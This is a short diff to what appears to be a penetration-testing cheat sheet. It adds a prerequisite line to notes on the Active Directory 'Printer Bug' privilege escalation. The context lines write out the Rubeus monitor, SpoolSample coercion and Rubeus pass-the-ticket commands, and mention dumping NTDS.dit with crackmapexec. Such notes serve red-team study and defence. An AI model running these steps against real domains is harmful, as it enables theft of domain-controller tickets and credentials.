@@ -190,6 +190,7 @@ PrivEsc
     crackmapexec can dump NTDS.dit
     
   Printer Bug (Get DC TGT from Unconstrained Delegation machine)
+      Must exploit a system running Unconstrained Delegation (UD)
       Rubeus monitor /interval:1 (monitors for TGT when spoolsample is run)
       Spoolsample.exe \\DC01.FQDN \\UnConstrainedDelegation.FQDN
       Rubeus.exe ptt /ticket:doIE+DCCBPSgAwIB... (should not have valid TGT in memory)
